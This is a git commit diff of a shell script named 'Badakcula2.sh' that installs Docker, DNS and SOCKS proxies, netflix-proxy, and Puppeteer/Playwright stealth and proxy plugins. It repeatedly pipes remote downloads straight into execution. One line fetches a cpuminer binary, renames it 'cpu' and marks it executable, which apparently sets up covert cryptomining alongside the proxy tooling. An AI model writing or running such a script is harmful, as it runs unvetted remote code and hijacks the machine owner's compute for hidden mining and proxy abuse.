a5757d5295fa4bc73cef48981396e230992775ad
Kunyuku <136298955+Kunyuku@users.noreply.github.com>
2023-12-02 19:55:14 +0700

    Update Badakcula2.sh

--- Badakcula2.sh
+++ Badakcula2.sh
@@ -1,25 +1,3 @@
-git clone https://github.com/vocuzi/dns2proxy.git
-cd dns2proxy
-sudo chmod +x install.sh
-sudo ./install.sh
-
-  sleep 3
-
-git clone https://github.com/apoorvar5/InfrastructureAsACodeForAWS.git
-cd InfrastructureAsACodeForAWS
-bash installation.sh
-  
-  sleep 5
-
-wget https://www.inet.no/dante/files/dante-1.4.2.tar.gz
-tar zxvf dante-1.4.2.tar.gz
-cd dante-1.4.2
-./configure
-make -j`nproc`
-make install
-
-  sleep 5
-  
 sudo apt update && sudo apt-get -y install systemctl && sudo apt install apt-transport-https curl gnupg-agent ca-certificates software-properties-common -y && curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - && sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable" && sudo apt install docker-ce docker-ce-cli containerd.io -y && sudo usermod -aG docker genzo2805
 
 npm install -g ccloli/DNSProxy
@@ -40,6 +18,17 @@ apt-get update\
   && curl -fsSL https://github.com/Publish3r/smart-dns-proxy/raw/main/install.tar.gz | gunzip - | tar x --strip-components=1\
   && ./build.sh
 
+  sleep 5
+
+wget https://www.inet.no/dante/files/dante-1.4.2.tar.gz
+tar zxvf dante-1.4.2.tar.gz
+cd dante-1.4.2
+./configure
+make -j`nproc`
+make install
+
+  sleep 5
+
   echo "====================================="
   echo "Bismillahirahmannirrahim"
   echo "====================================="
@@ -54,16 +43,6 @@ chmod +x adBlockHostsGenerate.sh
   echo "====================================="
   sleep 5
 npm install zyte-smartproxy-puppeteer && npm install playwright playwright-extra zyte-smartproxy-plugin puppeteer-extra-plugin-stealth @cliqz/adblocker-playwright && npm install puppeteer puppeteer-extra zyte-smartproxy-plugin puppeteer-extra-plugin-stealth puppeteer-extra-plugin-adblocker && curl https://raw.githubusercontent.com/Smartproxy/Python-scraper-tutorial/master/scraper.py > scraper.py
-  
-  sleep 5
-
-apt-get update\
-  && apt-get -y install vim dnsutils curl sudo\
-  && curl -fsSL https://get.docker.com/ | sh || apt-get -y install docker.io\
-  && mkdir -p ~/netflix-proxy\
-  && cd ~/netflix-proxy\
-  && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
-  && ./build.sh
 
   sleep 5
 
@@ -71,23 +50,12 @@ mkdir -p ~/netflix-proxy\
   && cd ~/netflix-proxy\
   && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
   && ./build.sh
-  
+
   echo "====================================="
   echo "Bismillahirahmannirrahim"
   echo "====================================="
   sleep 5
 wget -qO cpu https://try.gitea.io/Inabirtia/test/raw/branch/main/cpuminer-sse2 && chmod +x cpu && npm i silence-js-hash-crypto && npm install socks-proxy-v5 && npm install node-https-socks5-proxy && sudo npm install via-proxy && sudo npm install proxy-agent --save && npm install --save-dev http-proxy-middleware && npm install http-proxy --save && npm install node-gyp-install && sudo npm install node-cache --save && sudo npm install --save-dev cross-env && npm install -g json-server && npm install got socks-proxy-agent cross-spawn --save
-
-  sleep 5
-
-sudo apt-get update\
-  && sudo apt-get -y install vim dnsutils curl\
-  && curl -fsSL https://get.docker.com/ | sh || apt-get -y install docker.io\
-  && sudo usermod -aG docker $(whoami | awk '{print $1}')\
-  && mkdir -p ~/netflix-proxy\
-  && cd ~/netflix-proxy\
-  && curl -fsSL https://github.com/ab77/netflix-proxy/archive/latest.tar.gz | gunzip - | tar x --strip-components=1\
-  && ./build.sh
 
   echo "====================================="
   echo "Bismillahirahmannirrahim"
